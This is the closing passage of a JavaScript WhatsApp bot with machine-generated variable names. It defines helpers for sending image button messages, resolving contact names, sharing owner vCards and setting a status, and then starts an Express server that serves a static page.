      ...p150
    });
  };
  vMakeWASocket2.send5ButImg = async (p151, p152 = "", p153 = "", p154, p155 = [], p156, p157 = {}) => {
    let v199 = await prepareWAMessageMedia({
      image: p154,
      jpegThumbnail: p156
    }, {
      upload: vMakeWASocket2.waUploadToServer
    });
    var vGenerateWAMessageFromContent2 = generateWAMessageFromContent(p151, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: v199.imageMessage,
          hydratedContentText: p152,
          hydratedFooterText: p153,
          hydratedButtons: p155
        }
      }
    }), p157);
    vMakeWASocket2.relayMessage(p151, vGenerateWAMessageFromContent2.message, {
      messageId: vGenerateWAMessageFromContent2.key.id
    });
  };
  vMakeWASocket2.getName = (p158, p159 = false) => {
    id = vMakeWASocket2.decodeJid(p158);
    p159 = vMakeWASocket2.withoutContact || p159;
    let v200;
    if (id.endsWith("@g.us")) {
      return new Promise(async p160 => {
        v200 = store.contacts[id] || {};
        if (!v200.name.notify && !v200.subject) {
          v200 = vMakeWASocket2.groupMetadata(id) || {};
        }
        p160(v200.name || v200.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    } else {
      v200 = id === "0@s.whatsapp.net" ? {
        id: id,
        name: "WhatsApp"
      } : id === vMakeWASocket2.decodeJid(vMakeWASocket2.user.id) ? vMakeWASocket2.user : store.contacts[id] || {};
    }
    return (p159 ? "" : v200.name) || v200.subject || v200.verifiedName || PhoneNumber("+" + p158.replace("@s.whatsapp.net", "")).getNumber("international");
  };
  vMakeWASocket2.sendContact = async (p161, p162, p163 = "", p164 = {}) => {
    let v201 = [];
    for (let v202 of p162) {
      v201.push({
        displayName: await vMakeWASocket2.getName(v202 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:" + (await vMakeWASocket2.getName(v202 + "@s.whatsapp.net")) + "\nFN:" + global.OwnerName + "\nitem1.TEL;waid=" + v202 + ":" + v202 + "\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:" + global.email + "\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/" + global.github + "/GMAX\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;" + global.location + ";;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    vMakeWASocket2.sendMessage(p161, {
      contacts: {
        displayName: v201.length + " Contact",
        contacts: v201
      },
      ...p164
    }, {
      quoted: p163
    });
  };
  vMakeWASocket2.setStatus = p165 => {
    vMakeWASocket2.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status"
      },
      content: [{
        tag: "status",
        attrs: {},
        content: Buffer.from(p165, "utf-8")
      }]
    });
    return p165;
  };
  vMakeWASocket2.serializeM = p166 => sms(vMakeWASocket2, p166, store);
}
vExpress.use(express.static(path.join(__dirname, "lib")));
vExpress.get("/", (p167, p168) => {
  p168.redirect("/gmax.html");
});
vExpress.listen(v109, () => console.log("Server listening on port http://localhost:" + v109));
setTimeout(() => {
  f4();
}, 4000);
